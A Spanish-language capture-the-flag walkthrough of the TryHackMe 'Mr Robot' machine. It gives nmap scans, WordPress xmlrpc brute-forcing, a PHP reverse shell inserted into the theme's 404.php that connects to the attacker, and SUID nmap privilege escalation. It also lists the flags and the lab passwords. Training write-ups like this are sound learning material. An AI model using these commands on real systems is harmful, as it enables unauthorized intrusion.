# MrRobot

### tags: `Try Hack Me` `Linux` `Wordpress CMS` `John` `SUID` `Nmap`

## **FLAGS:**

* Key 1: 073403c8a58a1f80d943455fb30724b9
* Key 2: 822c73956184f694993bede3eb39f959
* Key 3: 04787ddef27c3dee1ee161b21670b4e4

## **USERS:**

* Elliot \(pwd: ER28-0652\)
* robot \(pwd: abcdefghijklmnopqrstuvwxyz\)

## **ENUMERACIÓN**

1. Vemos si el host esta levantado y saber el SSOO \(**Linux**: TTL &lt;= 64\) `ping -c1 IP`

   ![](https://i.imgur.com/zU3qZea.png)

2. Escaneamos los puertos abiertos
   * Primero vemos si va muy lento el escaneo: `nmap -p- --open -T5 -v -n IP`

     ```text
       -p-        Todos los puertos
       --open     Mostrar solos puertos abiertos
       -T5        Modo más agresivo
       -v         Modo verbose (reporta por pantalla)
       -n        No aplicar resolución DNS
     ```

   * Como va lento, lanzamos este otro comando: `nmap -sS --min-rate 5000 -p- -vvv -n -Pn IP`

     ```text
       -sS        Realizar un TCP SYN port scan
       --min-rate    Emitir al menos 5000 paquetes por segundo
       -Pn        No realizar Host Discovery
     ```

     * Va más rápido y encuentra los puertos 22 \(SSH\), 80 \(HTTP\) y 443 \(HTTPS\), aunque nos dice que están cerrados.

       ![](https://i.imgur.com/ZpanGoL.png)
3. Obtenemos los servicios que corren en los puertos `nmap -sC -sV -p22,80,443 IP`

   ![](https://i.imgur.com/yJmkbWJ.png)

4. Nos centramos en el servidor web Apache. Lanzamos un whatweb para ver si usa algún CMS tipo Wordpress, pero vemos que no, es un Apache normal

   ![](https://i.imgur.com/vvi3qFK.png)

5. Accedemos al portal web y con Wappalyzer vemos que es un Wordpress. El portal tiene una especie de terminal con comandos:

   ![](https://i.imgur.com/Zbpdi1J.png)

6. Intentamos hacer fuzzing pero va muy lento, no se puede.
7. Jugamos con la web y los videos locos y tras unos errores nos muestra la página de error de Wordpress.

   ![](https://i.imgur.com/v9eQ7VG.png)

   * Desde ahí, podemos acceder a wp-login.php, el login básico de Wordpress.

     ![](https://i.imgur.com/dWZdlIf.png)

## **WORDPRESS**

Seguimos esta [guía](https://www.toxicsolutions.net/2020/07/wordpress-ctf-walkthrough/) para conseguir acceso a un Wordpress.

1. Primero enumeramos el Wordpress en busca de vulnerabilidades con wpscan

   `wpscan --url IP`

2. Vemos que encuentra el robots.txt:

   ![](https://i.imgur.com/p4TPeY4.png)

   * Al entrar, vemos algo raro:

     ![](https://i.imgur.com/RgyKV7I.png)

   * Si probamos a entrar en el fichero "key-1-of-3.txt", vemos la 1a flag

     ![](https://i.imgur.com/ZMvdtMt.png)

     Tenemos la 1a key: **073403c8a58a1f80d943455fb30724b9**

3. En el robtos.txt vemos otro fichero "**fsocity.dic**". Lo descargamos, parece un diccionario:

   ![](https://i.imgur.com/OTCkXO3.png)

   * Vemos algunas palabras que pueden ser utiles, como "Elliot".
   * Probamos en el login y vemos que el usuario existe:

     ![](https://i.imgur.com/eJdLqH4.png)

     Tenemos un usuario: **Elliot**

4. Vemos que la versión es **4.3.1**, considerada insegura. Podemos buscar exploits más adelante. Vemos que usa el tema **twentyfifteen**. No hay plugins instalados.

   ![](https://i.imgur.com/VqhyeGk.png)

   ![](https://i.imgur.com/GBsjeIY.png)

   * A parte de la enumeración de usuarios, no vemos nada reseñable para poder acceder

     ![](https://i.imgur.com/51Xb9vr.png)

5. Intentamos enumerar los usuarios, pero no existe la ruta "wp-json/wp/v2/users". Toca tirar con el usuario Elliot.
6. Con wpscan vemos que está habilitado el **xml-rpc**. Lo podemos explotar más tarde para hacer fuerza bruta, siguiendo esta [guía](https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/).

   ![](https://i.imgur.com/n070Hxy.png)

7. Vamos a intentar fuerza bruta sobre con el diccionario descargado y el usuario Elliot. El diccionario tiene 800.000 lineas, pero si lo ordenamos y quitamos repetidas, se queda en 11.000.
   * Intentamos la fuerza bruta sobre el xmlrpc con Burp pero va muy muy lento.
   * Wpscan tiene una opción para hacer fuerza bruta sobre el xmlrpc con la opción Multicall:

     `wpscan --url IP -U Elliot -P DICT`

     ![](https://i.imgur.com/q3cMdRq.png)

     Tenemos la password de Elliot: **ER28-0652**
8. Conseguimos acceso al Wordpress:

   ![](https://i.imgur.com/WLOAqEW.png)

## **GET A SHELL**

Al tratarse de un Wordpress, como ya tenemos acceso, vamos a intentar editar algún PHP del tema para meter una shell reversa. Probamos con el **404.php**, que es el típico.

![](https://i.imgur.com/7RvuxiL.png)

Hemos puesto un **echo** y al acceder a una página que no existe, vemos la página 404 que muestra ese echo:

![](https://i.imgur.com/T14AFLJ.png)

Vamos a intentar acceder con shell reversa. Usamos este [Cheat-Sheet](https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/).

* Levantamos un puerto en escucha en nuestro Kali:

  `nc -lvp 8433`

* En el fichero 404, introducimos lo siguiente:

  `$sock = fsockopen($ip,$port);`

  `$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);`

  ![](https://i.imgur.com/HHdMtZW.png)

* Al acceder a la página 404, conseguimos una Shell en el servidor como el usuario daemon.

  ![](https://i.imgur.com/cHi9tAN.png)

* Podemos configurar una shell interactiva escribiendo lo siguiente por la shell reversa:
  1. python -c 'import pty; pty.spawn\("/bin/bash"\)'
  2. script /dev/null -c bash
  3. CTRL + Z
  4. stty raw -echo
  5. fg
  6. reset
  7. xterm
  8. export TERM=xterm
  9. export SHELL=bash
  10. stty -a
  11. stty rows _NumRows_ columns _NumCols_

      _Obtenemos NumRows y NumCols con stty -a en otra terminal con la misma dimensión que la shell reversa_

## **USER FLAG**

Intentamos encontrar la 2a flag con el siguiente comando:

`find / -type f -name key-2-of-3.txt 2> /dev/null`

![](https://i.imgur.com/MrCMa2A.png)

Vemos que esta en el directorio home del usuario "**robot**".

Tenemos un usuario: **robot**

No podemos ver el contenido del fichero. Hay que iniciar sesión con el usuario robot.

En el directorio vemos un fichero con el hash de una password.

![](https://i.imgur.com/eX3cun5.png)

Probamos en [Crackstation](https://crackstation.net/) y nos da la password, un md5 bastante easy.

![](https://i.imgur.com/ptEdp5e.png)

Tenemos la password de robot: **abcdefghijklmnopqrstuvwxyz**

Con `su robot` e introduciendo la password anterior, iniciamos sesión como robot y podemos ver la flag.

![](https://i.imgur.com/ysyKBi3.png)

Tenemos la 2a key: **822c73956184f694993bede3eb39f959**

## **ROOT FLAG**

Vamos a intentar una escalada de privilegios en Linux siguiendo este [tutorial](https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4)

1. En primer lugar, intentamos ver los privilegios de sudo del usuario robot. No puede ejecutar el comando `sudo -l`.
2. Buscamos los ficheros con el SUID activo

   `find / -user root -perm -4000 2>/dev/null`

   ![](https://i.imgur.com/ZjpFVod.png)

3. Nos llama la intención **/usr/local/bin/nmap**. Podemos intentar usar el comando **nmap** para escalar privilegios:

   ![](https://i.imgur.com/fsUXBOE.png)

   * Introducimos los siguientes comandos:

     `nmap --interactive`

     **nmap&gt;** `!sh`

     ![](https://i.imgur.com/BZdjz5S.png)

4. Hemos escalado privilegios. Vamos al directorio /root a por la 3a Flag.

   ![](https://i.imgur.com/BnDRKnx.png)

   Tenemos la 3a key: **04787ddef27c3dee1ee161b21670b4e4**

